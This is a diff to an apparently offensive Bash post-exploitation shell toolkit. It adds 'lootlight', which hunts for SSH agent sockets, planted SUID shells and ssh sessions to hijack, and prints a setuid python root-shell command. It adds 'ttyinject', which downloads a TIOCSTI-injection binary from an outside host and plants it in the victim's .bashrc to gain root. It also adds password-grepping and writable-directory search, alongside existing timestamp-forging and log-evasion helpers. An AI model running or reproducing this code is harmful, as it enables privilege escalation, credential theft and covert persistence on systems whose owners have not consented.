@@ -94,7 +94,7 @@ notime() {
 
     [[ $# -le 1 ]] && { echo >&2 "notime <reference file> <cmd> ..."; return 255; }
     [[ ! -e "$ref" ]] && { echo >&2 "File not found: $ref"; return 255; }
-    [ $UID -ne 0 ] && { HS_ERR "Need root"; return 255; }
+    [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return 255; }
 
     shift 1
     now=$(date -Ins) || return
@@ -113,7 +113,8 @@ notime_cp() {
     local olddir_date
     local dir
 
-    [[ -z "$UID" ]] && UID="$(id -u)"
+    [ -z "$UID" ] && UID="$(id -u 2>/dev/null)"
+    [ -z "$USER" ] && USER="$(id -un 2>/dev/null)"
     [[ ! -f "$src" ]] && { echo >&2 "Not found: $src"; return 255; }
     if [[ -d "$dst" ]]; then
         dir="$dst"
@@ -332,6 +333,27 @@ zapme() {
     exec zapper -f -a"${1:--}" bash -il
 }
 
+# Find writeable dirctory but without displaying sub-folders
+# Usage: wfind /
+# Usage: wfind /etc /var /usr 
+wfind() {
+    local arr dir
+    local IFS
+
+    arr=("$@")
+    while [[ ${#arr[@]} -gt 0 ]]; do
+        dir=${arr[${#arr[@]}-1]}
+        unset "arr[${#arr[@]}-1]"
+        find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
+        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
+    done
+}
+
+# Only output the 16 charges before and 32 chars after..
+hgrep() {
+    grep -HEronasi  ".{,16}${1:-password}.{,32}" .
+}
+
 bin() {
     local arch="$(uname -m)"
     local os="$(uname -s)"
@@ -341,7 +363,10 @@ bin() {
 
     [ -z "$os" ] && os="Linux"
     [ -z "$arch" ] && arch="x86_64"
-    [ -n "$single" ] && unset is_showhelp
+    [ -n "$single" ] && {
+        FORCE=1 # implied. Always download even if systemwide exists
+        unset is_showhelp
+    }
     a="${arch}"
 
     hs_mkxhome
@@ -457,6 +482,38 @@ _loot_homes() {
     done
 }
 
+lootlight() {
+    local str
+    ls -al /tmp/ssh-* &>/dev/null && {
+        echo -e "${CB}SSH-AGENT${CDY}${CF}"
+        find /tmp -name 'agent.*' -ls
+        echo -e "${CN}"
+    }
+
+    [ "$UID" -ne 0 ] && {
+        unset str
+        str="$(find /var/tmp /tmp -maxdepth 2 -uid 0  -perm /u=s -ls 2>/dev/null)"
+        [ -n "$str" ] && {
+            echo -e "${CB}B00M-SHELL ${CDY}${CF}"
+            echo "${str}"
+            echo -en "${CN}"
+            echo -e "${CDW}TIP: ${CDC}"'./b00m -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
+        }
+    }
+
+    unset str
+    if command -v pgrep >/dev/null; then
+        str="$(pgrep -x 'ssh' -a)"
+    elif command -v ps >/dev/null; then
+        str="$(ps alx | grep "ssh " | grep -v grep)"
+    fi
+    [ -n "$str" ] && {
+        echo -e "${CB}SSH-Hijack (reptyr)${CDY}${CF}"
+        echo "${str}"
+        echo -e "${CN}"
+    }
+}
+
 # Someone shall implement a sub-set from TeamTNT's tricks (use
 # noseyparker for cpu/time-intesive looting). TeamTNT's infos:
 # https://malware.news/t/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/71346
@@ -512,11 +569,7 @@ loot() {
     _loot_homes "AWS S3" ".boto"
     _loot_homes "NETRC"  ".netrc"
 
-    ls -al /tmp/ssh-* &>/dev/null && {
-        echo -e "${CB}SSH AGENT${CDY}${CF}"
-        find /tmp -name 'agent.*' -ls
-        echo -e "${CN}"
-    }
+    lootlight
 }
 
 ws() {
@@ -533,6 +586,29 @@ _hs_destruct() {
 destruct() {
     _hs_destruct
     export HOME="${_HS_HOME_ORIG}"
+}
+
+ttyinject() {
+    local is_mkdir
+    ttyinject_clean() {
+        [ -e "${_HS_HOME_ORIG}/.config/procps/reset" ] && rm -f "${_HS_HOME_ORIG}/.config/procps/reset"
+        [ -n "$is_mkdir" ] && rmdir "${_HS_HOME_ORIG}/.config/procps"
+    }
+
+    [ "$UID" -eq 0 ] && { HS_ERR "You are already root"; return; }
+    [ ! -d "${_HS_HOME_ORIG}/.config/procps" ] && { mkdir -p "${_HS_HOME_ORIG}/.config/procps" || return; is_mkdir=1; }
+
+    [ ! -f "${_HS_HOME_ORIG}/.config/procps/reset" ] && {
+        dl "https://github.com/hackerschoice/ttyinject/releases/download/v1.1/ttyinject-linux-$(uname -m)" >"${_HS_HOME_ORIG}/.config/procps/reset" || return
+    }
+    chmod 755 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; return; }
+
+    TTY_TEST=1 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; HS_WARN "System is not vulnerable to TIOCSTI stuffing."; return; }
+    [ -f "${_HS_HOME_ORIG}/.bashrc" ] && ! grep -qFm1 'procps/reset' "${_HS_HOME_ORIG}/.bashrc" 2>/dev/null && {
+        echo "$(head -n1 "${_HS_HOME_ORIG}/.bashrc")"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 "${_HS_HOME_ORIG}/.bashrc")" >~/.bashrc
+    }
+    echo -e "Wait for ${CDY}/var/tmp/.socket${CN} to appear and then do:
+  ${CDC}"'/var/tmp/.socket -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
 }
 
 hs_exit() {
@@ -644,7 +720,7 @@ hs_init_alias() {
     alias cd..='cd ..'
     alias ..='cd ..'
 
-    command -v curl >/dev/null && curl --help curl | grep -i proto-default && alias curl="--proto-default https"
+    command -v curl >/dev/null && curl --help | grep -i proto-default && alias curl="curl --proto-default https"
 }
 
 hs_init_shell() {
@@ -689,7 +765,10 @@ ${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${
 ${CDC} shred file                            ${CDM}Securely delete a file
 ${CDC} notime <file> rm -f foo.dat           ${CDM}Execute a command at the <file>'s ctime & mtime
 ${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
+${CDC} ttyinject                             ${CDM}Become root when root switches to ${USER:-this user}
+${CDC} wfind <dir> [<dir> ...]               ${CDM}Find writeable directories
 ${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
+${CDC} hgrep <string>                        ${CDM}Grep for pattern, output for humans ${CN}${CF}[hgrep password]
 ${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
 ${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
 ${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP
@@ -698,15 +777,18 @@ ${CDC} np <directory>                        ${CDM}Display secrets with NoseyPar
 ${CDC} loot                                  ${CDM}Display common secrets
 ${CDC} ws                                    ${CDM}WhatServer - display server's essentials
 ${CDC} bin                                   ${CDM}Download useful static binaries
+${CDC} lt, lss, psg, lsg, ...                ${CDM}Common useful shotcuts
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
 }
+
 
 
 ### Programm
 hs_init "$0"
 hs_init_alias
 hs_init_shell
+
 xhelp
 
 ### Finishing
@@ -718,6 +800,9 @@ str=""
 echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
 echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
 echo -e ">>> ${CG}Setup complete. ${CF}${str}${CN}"
+
+### Check for obvious loots
+lootlight
 
 # unset all functions that are no longer needed.
 unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
